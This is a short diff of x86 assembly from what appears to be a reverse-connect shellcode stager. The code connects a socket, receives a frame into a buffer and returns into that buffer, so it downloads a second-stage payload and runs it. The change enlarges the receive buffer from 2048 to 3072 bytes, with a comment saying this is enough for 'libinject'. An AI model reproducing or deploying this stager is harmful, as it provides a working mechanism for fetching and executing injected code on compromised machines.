@@ -67,8 +67,8 @@ call_connect:               ; connect(socket, sockaddr, addrlen)
 
   ; recv frame
   push ebx                  ; flags
-  mov bh, 0x08              ; len (2048)
-  push ebx                  ; len (2048)
+  mov bh, 0x0c              ; len
+  push ebx                  ; len 3072 (just enough for libinject)
   push ecx                  ; buffer
   push edi                  ; socket
   push ecx                  ; return into buffer
